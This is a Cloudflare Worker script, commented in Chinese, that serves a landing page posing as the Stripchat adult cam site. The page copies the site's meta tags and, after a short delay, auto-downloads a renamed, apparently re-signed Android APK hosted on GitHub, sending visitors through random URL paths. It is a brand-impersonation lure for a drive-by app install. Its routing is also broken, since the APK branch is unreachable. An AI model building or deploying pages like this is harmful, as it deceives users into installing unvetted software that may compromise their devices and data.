addEventListener('fetch', event => {
  event.respondWith(handleRequest(event.request))
})

async function handleRequest(request) {
  const url = new URL(request.url)
  
  // 如果是根路径访问
  if (url.pathname === '/') {
    // 生成随机字符串
    const randomString = generateRandomString(8)
    return Response.redirect(`${url.origin}/${randomString}`, 302)
  }

  // 读取index.html的内容
  const html = `<!doctype html>
<html lang="en">
<head prefix="og: http://ogp.me/ns# fb: http://ogp.me/ns/fb# website: http://ogp.me/ns/website#">
    <meta charset=utf-8>
    <title>Free Live Sex Cams and Nude Girls Chat | Stripchat</title>
    <meta data-helmet="1" property="og:type" content="website">
    <meta data-helmet="1" property="og:image" content="https://cdn.strpst.com/assets/icons/metaogimage.jpg?v=4f3e5e4b">
    <meta data-helmet="1" property="og:url" content="https://en.stripchat.com/">
    <meta data-helmet="1" name="twitter:card" content="summary_large_image">
    <meta data-helmet="1" property="og:site_name" content="Stripchat – Free Live Cams Community">
    <meta data-helmet="1" name="twitter:creator" content="@stripchat">
    <meta data-helmet="1" name="twitter:site" content="@stripchat">
    <meta data-helmet="1" property="og:title" content="Free Live Sex Cams and Nude Girls Chat">
    <meta data-helmet="1" property="og:description" content="Watch naked models in our adult live sex cam community.">
    <meta data-helmet="1" name="description" content="Watch naked models in our adult live sex cam community.">
</head>
<body>
    <div class="content-container">
        <h1>Downloading the app...</h1>
        <span style="margin-top:50px">Not responding? Click here to <a href="stripchat_super_en_edit_sign.apk" style="text-decoration:underline;color:#fff;">install manually</a></span>
    </div>
    <script>
        setTimeout(function(){
            window.location.href = "stripchat_super_en_edit_sign.apk";
        },1500);
    </script>
</body>
</html>`

  // 如果访问的是随机路径，返回HTML内容
  if (url.pathname.length > 1) {
    return new Response(html, {
      headers: {
        'content-type': 'text/html;charset=UTF-8',
      },
    })
  }

  // 如果访问的是apk文件
  if (url.pathname.endsWith('.apk')) {
    // 将APK文件上传到可以直接下载的位置，然后将URL替换到这里
    return Response.redirect('https://github.com/SLOMEDIALLC/stripchat/raw/main/stripchat_super_en_edit_sign.apk', 302)
  }

  // 默认返回404
  return new Response('Not Found', { status: 404 })
}

function generateRandomString(length) {
  const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
  let result = ''
  for (let i = 0; i < length; i++) {
    result += characters.charAt(Math.floor(Math.random() * characters.length))
  }
  return result
}
